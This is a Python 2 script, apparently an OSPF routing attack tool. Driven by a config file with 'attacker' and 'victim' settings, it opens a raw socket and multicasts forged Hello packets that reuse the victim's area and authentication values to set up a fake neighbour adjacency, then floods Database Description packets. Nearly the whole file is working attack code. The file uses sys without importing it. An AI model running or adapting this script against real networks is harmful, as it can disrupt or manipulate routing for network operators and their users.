import random
import socket
import struct
import threading
import time
from struct import *

import yaml

from network.OSPFSerializer import serialize_ospf_hello_header, serializeOSPFDatabaseHeader
from packet.OSPFDatabaseDescriptorHeader import OSPFDatabaseDescriptorHeader
from packet.OSPFHelloHeader import OSPFHelloHeader


def send_dd_updates(config, sfd):
    time.sleep(config['attacker']['wait_between_dd'])  # wait before next packet

    seq_number = random.randint(100, 2000)
    dd_update = OSPFDatabaseDescriptorHeader(config['ospf']['version'], 32, config['attacker']['id'],
                                             config['victim']['area_id'], config['victim']['auth_type'],
                                             config['victim']['auth1'], config['victim']['auth2'],
                                             config['attacker']['interface_mtu'], seq_number)
    dd_update.set_control_master_slave_bit(True)
    dd_update.set_control_initial_bit(True)
    dd_update.set_control_more_bit(True)

    try:
        # Send initial DB update
        sfd.sendto(serializeOSPFDatabaseHeader(dd_update),
                   (config['ospf']['multicast_ospf_routers'], config['ospf']['port']))

        dd_update.set_control_initial_bit(False)  # no longer the initial packet
        for i in range(0, config['attacker']['dd_count'], 1):
            time.sleep(config['attacker']['wait_between_dd'])  # wait before next packet
            dd_update.increment_sequence()           
            sfd.sendto(serializeOSPFDatabaseHeader(dd_update),
                       (config['ospf']['multicast_ospf_routers'], config['ospf']['port']))
            
        
        time.sleep(config['attacker']['wait_between_dd'])  # wait before next packet
        dd_update.increment_sequence()
        dd_update.set_control_more_bit(False)  # no more packets
        sfd.sendto(serializeOSPFDatabaseHeader(dd_update),
                   (config['ospf']['multicast_ospf_routers'], config['ospf']['port']))
    except socket.error, msg:
        print 'Socket could not be created. Message: ' + str(msg)
        sys.exit()

def send_hello_packet(config, sfd):
    hello_packet = OSPFHelloHeader(config['ospf']['version'], 48, config['attacker']['id'],
                                   config['victim']['area_id'], config['victim']['auth_type'],
                                   config['victim']['auth1'], config['victim']['auth2'], config['network']['mask'],
                                   config['victim']['hello_interval'], config['attacker']['priority'],
                                   config['victim']['dead_interval'], config['victim']['id'], config["attacker"]["id"], 
                                   config['victim']['id'])
    hello_packet.set_option_e(True)

    try:
        while True:
            print "Sending hello packet..."
            sfd.sendto(serialize_ospf_hello_header(hello_packet),
                       (config['ospf']['multicast_ospf_routers'], config['ospf']['port']))
            time.sleep(config['victim']['hello_interval'])
    except socket.error, msg:
        print 'Socket could not be created. Message: ' + str(msg)
        sys.exit()


def main():
    # open configuration file
    with open("config.yml", 'r') as ymlfile:
        config = yaml.load(ymlfile)

    # initialize the socket
    try:
        # create the socket
        sfd = socket.socket(socket.AF_INET, socket.SOCK_RAW, config['ospf']['port'])
        # sfd.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, struct.pack('b', 1))

        # Start sending Hello packets according to configuration
        thread = threading.Thread(target=send_hello_packet, args=(config, sfd))
        thread.start()

        # Send the DB updates
        send_dd_updates(config, sfd)

    except socket.error, msg:
        print 'Socket could not be created. Message: ' + str(msg)
        sys.exit()


if __name__ == "__main__":
    main()
